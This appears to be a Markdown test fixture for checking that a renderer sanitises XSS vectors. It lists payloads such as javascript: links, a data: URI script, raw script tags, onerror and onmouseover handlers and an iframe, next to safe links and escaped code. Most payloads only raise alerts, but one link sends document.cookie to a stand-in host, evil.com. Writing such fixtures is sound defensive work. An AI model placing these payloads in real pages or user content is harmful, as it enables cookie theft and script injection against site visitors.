# XSS Test Markdown

## javascript: links
[Click me](javascript:alert('md-js-link'))
[Steal cookies](javascript:fetch('http://evil.com/?c='+document.cookie))
[Data URI](data:text/html,<script>alert('data-uri')</script>)

## Safe links (should work)
[Google](https://google.com)
[Email](mailto:test@test.com)

## Script injection via markdown
<script>document.title = "MD_SCRIPT_XSS";</script>

## Image with onerror
![img](x" onerror="alert('md-img-xss'))

## Inline HTML
<img src=x onerror="alert('md-inline-img-xss')">
<iframe src="javascript:alert('md-iframe-xss')"></iframe>
<div onmouseover="alert('md-hover-xss')">Hover me</div>
<a href="javascript:alert('md-a-xss')">Click me</a>

## Bold with injection
**<img src=x onerror=alert('md-bold-xss')>**

## Code that should be escaped
`<script>alert('inline-code')</script>`

```
<script>alert('code-block')</script>
```
